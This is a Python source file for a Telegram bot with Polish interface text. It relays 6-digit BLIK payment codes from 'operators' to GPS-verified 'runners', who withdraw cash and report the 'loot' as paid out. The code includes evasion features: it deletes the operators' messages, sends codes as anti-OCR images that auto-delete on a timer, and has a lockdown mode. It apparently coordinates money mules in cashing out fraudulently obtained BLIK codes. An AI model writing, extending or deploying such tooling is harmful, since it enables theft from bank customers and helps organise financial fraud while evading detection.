import asyncio
from aiogram import Router, types, F, Bot
from aiogram.utils.keyboard import InlineKeyboardBuilder
from database.repository import InMemoryRepository
from config import AppConfig, UserRole, SystemSettings
from core.security import SecurityEngine

router = Router()

@router.message(F.location)
async def handle_location(message: types.Message, repo: InMemoryRepository):
    uid = message.from_user.id
    user = repo.get_user(uid)
    if user and user.role == UserRole.RUNNER:
        user.is_geo_verified = True
        repo.save_user(user)
        await message.answer("✅ Lokalizacja GPS zweryfikowana. Oczekuj na sygnały.")

@router.message(F.text == "📥 DODAJ KOD")
async def request_blik(message: types.Message, repo: InMemoryRepository):
    user = repo.get_user(message.from_user.id)
    if user and user.role in [UserRole.OPERATOR, UserRole.ADMIN]:
        await message.answer("Podaj 6-cyfrowy kod BLIK:")

@router.message(lambda m: m.text and m.text.isdigit() and len(m.text) == 6)
async def incoming_blik_signal(message: types.Message, repo: InMemoryRepository, config: AppConfig, settings: SystemSettings, bot: Bot):
    uid = message.from_user.id
    user = repo.get_user(uid)
    
    if not user or user.role not in [UserRole.OPERATOR, UserRole.ADMIN]:
        return
    
    if settings.maintenance_mode:
        return await message.answer("⚠️ System jest w trybie Lockdown. Operacja odrzucona.")
    
    code = message.text
    tx_id = f"TX{message.message_id}"
    
    try:
        await message.delete()
    except Exception:
        pass
    
    repo.add_active_tx(tx_id, {"code": code, "op_id": uid})
    
    kb = InlineKeyboardBuilder()
    button_text = "⚡️ PRZEJMIJ SYGNAŁ (GPS)" if settings.gps_required else "⚡️ PRZEJMIJ SYGNAŁ"
    kb.button(text=button_text, callback_data=f"clm_{tx_id}")
    
    await bot.send_message(
        config.GROUP_ID, 
        f"🚨 **NOWY SYGNAŁ**\nID: `{tx_id}`\nOczekiwanie na podjęcie...", 
        reply_markup=kb.as_markup(),
        parse_mode="Markdown"
    )
    await message.answer(f"✅ Kod wprowadzony do sieci. ID: `{tx_id}`", parse_mode="Markdown")

@router.callback_query(lambda c: c.data.startswith("clm_"))
async def claim_signal(callback: types.CallbackQuery, repo: InMemoryRepository, settings: SystemSettings, bot: Bot, config: AppConfig):
    uid = callback.from_user.id
    user = repo.get_user(uid)
    tx_id = callback.data.split("_")[1]
    
    if not user or user.role != UserRole.RUNNER:
        return await callback.answer("Brak uprawnień do przejęcia kodu.", show_alert=True)
    
    if settings.gps_required and not user.is_geo_verified:
        return await callback.answer("❌ Najpierw potwierdź lokalizację GPS (w menu).", show_alert=True)
    
    tx_data = repo.get_tx(tx_id)
    if not tx_data:
        return await callback.answer("❌ Transakcja wygasła lub została przejęta.")
    
    code = tx_data["code"]
    repo.remove_tx(tx_id)
    
    status_kb = InlineKeyboardBuilder()
    status_kb.button(text="✅ WYPŁACONE", callback_data=f"done_{tx_id}_{tx_data['op_id']}")
    status_kb.button(text="❌ BŁĄD", callback_data=f"err_{tx_id}_{tx_data['op_id']}")
    
    if settings.anti_ocr_active:
        img_buf = SecurityEngine.generate_stealth_image(code)
        msg = await bot.send_photo(
            uid, 
            types.BufferedInputFile(img_buf.read(), filename="tx.png"), 
            caption=f"🏁 **TX: {tx_id}**\nMasz {config.TX_TIMEOUT} sekund.", 
            reply_markup=status_kb.as_markup()
        )
    else:
        msg = await bot.send_message(
            uid, 
            f"🏁 **TX: {tx_id}**\nKOD: `{code}`\nMasz {config.TX_TIMEOUT} sekund.", 
            reply_markup=status_kb.as_markup(),
            parse_mode="Markdown"
        )
    
    await bot.send_message(tx_data['op_id'], f"🎯 Runner {callback.from_user.first_name} przejął kod. Oczekiwanie na wynik...")
    await callback.answer("Przejęto.")

    if settings.auto_delete_tx:
        await asyncio.sleep(settings.TX_TIMEOUT)
        try:
            await bot.delete_message(uid, msg.message_id)
        except Exception:
            pass

@router.callback_query(lambda c: c.data.startswith("done_") or c.data.startswith("err_"))
async def finalize_tx(callback: types.CallbackQuery, bot: Bot):
    parts = callback.data.split("_")
    action = parts[0]
    tx_id = parts[1]
    op_id = int(parts[2])
    
    if action == "done":
        await bot.send_message(op_id, f"✅ **SUKCES TX {tx_id}**\nUrobek wypłacony.", parse_mode="Markdown")
        await callback.message.edit_reply_markup(reply_markup=None)
        await callback.message.reply("Zaksięgowano wypłatę.")
    else:
        await bot.send_message(op_id, f"❌ **BŁĄD TX {tx_id}**\nRunner zgłosił problem z kodem/pinem.", parse_mode="Markdown")
        await callback.message.edit_reply_markup(reply_markup=None)
        await callback.message.reply("Zgłoszono błąd do operatora.")
    await callback.answer()

